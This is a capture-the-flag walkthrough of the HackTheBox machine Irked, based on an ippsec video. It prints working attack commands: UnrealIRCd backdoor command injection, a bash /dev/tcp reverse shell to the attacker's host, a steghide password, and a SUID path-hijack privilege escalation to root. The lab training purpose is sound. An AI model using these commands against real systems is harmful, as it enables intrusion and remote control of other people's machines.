---
published: true
---
Dissection of ippsec’s youtube video HackTheBox - Irked (Fixed). Box includes enumeration to UnrealIRCd server, stenography and tools, SUID stickybit that leads to root escalation.


----------

Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risks/responsibilities.*

----------

This series of write-up will contain comprehensive write-ups of hackthebox machines. In an effort to sharpen reporting techniques and help solidify the understand and methodologies used during penetration testing.


![#hailippsec](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556538635832_image.png)



YouTube Link: https://www.youtube.com/watch?v=OGFTM_qvtVI

# Enumeration

Nmap scan

    nmap -sC -sV -oA nmap/irked 10.10.10.117

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512253945_image.png)



## web-server

Check out web-server on port 80

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512312769_image.png)

since it says IRC move to perform full scan of box


## full nmap scan
    nmap -vvv -p- 10.10.10.117


## return to web-webserver

check out `robots.txt`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512446354_image.png)


*doesn’t exisit*

check for `~root` - some apache servers allow this (old/not very often)

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512492600_image.png)


## run gobuster
    gobuster -u http://10.10.10.117 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o root.log

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512588702_image.png)

## return to web-server

check `/index.html`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512638755_image.png)


*we get this main page. Establishing that the target is html.*

try `index.aspx`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512708707_image.png)


try `Default.aspx`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512735551_image.png)

## return to gobuster

discovered `/manual`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512787150_image.png)


check out `/manual`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512815884_image.png)


*gives default apache page. Copywrite is 2014 which could me its old.*


## nmap full port scan

returned an open port of `8067`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512904900_image.png)


Begin to enumerate what this port is with nmap:

    nmap -sC -sV -p 8067 10.10.10.10.117

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556512990438_image.png)


*port is open with UnrealIRCd.*

connect to port `8067` with ncat

    ncat 10.10.10.117 8067

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556513036609_image.png)


*since using the hostname we need to edit the ‘hosts’ on our local box to reflect*

edit host file:

    vi /etc/hosts

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556513108413_image.png)


check that hostname works with firefox and for any virtual host routing issues.

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556513135206_image.png)



## IRCd banner information grab

google “RFC IRC”

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556513210621_image.png)

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556513277405_image.png)


connect to IRC with ncat and pass the parameters

    PASS ippsec
    NICK ippsec
    USER ippsec PleaseSubscribe AndComment :ippsec


![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556513469519_image.png)


Search for unrealirc change log for version name

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556513642426_image.png)


*end up finding multiple vulnerabilities* 


## searchsploit UnrealIRC

    searchsploit unreal

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556513766362_image.png)


*metasploit backdoor command execution identified.*


google “unrealirc backdoor” leads to Link: https://lwn.net/Articles/392201/ which describes exactly how the exploit works.

nutshell: 
Backdoor disguised to look like debug code:

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556513937766_image.png)

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556513879421_image.png)


moving forward without metasploit as now know how the exploit functions.

## Setup tcpdump pipe to UnrealIRC

    tcpdump -i tun0 icmp

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556514052368_image.png)


setup ping to UnrealIrc:

    echo "AB; ping -c 1 10.10.14.3" | ncat 10.10.10.117 8067

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556514179163_image.png)


*after connection to IRC timed out we got an execution of the ping (ICMP) that was captured on tcpdump.*


## Command Execution

from the realization that a ping can be sent via the “AB” exploit now move to create a reverse shell


## setup listener & send reverse shell

    ncat -lvnp 9001

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556514322060_image.png)


reverse shell via IRC:

    echo "AB; bash -i >& /dev/tcp/10.10.14.3/9001 0>&1" | ncat 10.10.10.117 8067

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556514438383_image.png)


*wait for timeout… which didn’t result in a shell.*

retry but putting  bash `'` within the command just incase system is linked to nsh or dash

    echo "AB;  bash 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'" | ncat 10.10.10.117 8067

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556514603758_image.png)


*connection established and reverse shell.*


## upgrade shell

    python -c 'import pty;pty.spawn("/bin/bash")'
    background with ctrl+z
    stty raw -echo
    fg (enter) (enter)
    
    export TERM=xterm

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556514867595_image.png)



## Enumerate box

print working directory

    pwd
![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556514916306_image.png)


search directory:

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556514944874_image.png)


check `.bash_history` file:

    cat .bash_history | less

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556514996210_image.png)

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515027023_image.png)


found a `cd djmardov`

navigate to `cd djmardov`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515124596_image.png)


check when kernal  was compiled:
    uname -a

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515102392_image.png)


check for hidden files
    find . -ls

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515179389_image.png)


quite a few permission denied.
    find . -ls -type f

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515238066_image.png)

more permission denied.

## discovered user.txt

check `/Documents`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515299125_image.png)


we can not read because we are not `djmardov`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515378042_image.png)


there is a `.backup`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515447448_image.png)


and now we have a backup password for some stenography.

there has only been one image on this box the entire time and so now download locally

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515554067_image.png)

    curl http://10.10.10.117/irked.jpg -o irked.jpg

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515599920_image.png)



## use steghide

if not installed download via:

    apt install steghide

most commonly use on CTFs:

    steghide extract -sf irked.jp -p upUPdownDOWNdownLRlrBAbaSSss

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515774905_image.png)


ouputted a password file and a string



# Priv-Esc
## SSH Attempt as djmardov

    ssh djmardov@10.10.10.117
    (password: above string)

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515865635_image.png)

check files

    ls -al

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515907152_image.png)


Looking for anything obvious.


## return to user.txt

    find . | grep -i user.txt

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556515995208_image.png)


## Enumeration with LinEnum

create local web server hosting the LinEnum

    python -m SimpleHTTPServer 

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556516202039_image.png)


execute

    bash LinEnum.sh

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556516303873_image.png)


SUID files that stick out have last been modified in “2018”

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556537046619_image.png)


exim4 = mail server
viewuser = interesting prospect


## viewuser binary

Check SUID/sticky bit on `/usr/bin/viewuser`

    ls -la /usr/bin/viewuser

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556537141858_image.png)

*indeed this binary has the ability to run as root.*

Test the functionality of `viewuser`

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556537231447_image.png)


copy binary off remote box via base64

    base64 -w0 /usr/bin/viewuser 

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556537345690_image.png)


(copy to clipboard)

decode base64 locally:

    base64 -d viewuser.b64 > viewuser

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556537442842_image.png)


-could have been opened with Ghidra or Ida Pro opting to use `strace`

strace = list all sys calls

    strace ./viewuser

(difficult to read)

ltrace = another sys call outputer

    ltrace ./viewuser

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556537617135_image.png)


*the system(call) uses the variable “who” with no full path included which could lead to an entry to overwrite value. Which afterword changes the SUID and executes* `*/tmp/listusers*`*.*

Modify `/tmp/listusers` (target box)

    #!/bin/bash
    echo "Sending a shell"
    /bin/bash

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556537822085_image.png)


change chmod to executable

    chmod +x /tmp/listusers

which if executed launches a shell

Return to `viewusers` who en turn will execute this file should launch a bash shell as root.

    viewusers

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556537970531_image.png)

## secondary exploit of “who” statement
![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556538703367_image.png)


 *what should be seen is “/usr/bin/who”*

Locate who

    which who

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556538792140_image.png)


change PATH

    export PATH=/dev/shm:$PATH
    echo $PATH

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556539717409_image.png)


now we can edit `who`

    vi who
    (insert above /bin/bash)
    #!/bin/bash
    echo "Sending a shell"
    /bin/bash

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556539816117_image.png)


change chmod to executable

    chmod +x who
    viewuser

![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556539907803_image.png)


*did not priv-esc because the “who” calls the /bin/bash before the setuid(0) in the function causing it not to be vulnerable.*

# Loot&Root
![](https://paper-attachments.dropbox.com/s_ECCB58BFC7B8C7FB4F76DF55CC98C0E5842EECCD8EA52152FDA61793F88C4ED5_1556538067513_image.png)



----------

don’t know who ippsec is? check him out at:
 
 Youtube: https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
 Twitter: https://twitter.com/ippsec
 
 #hailippsec

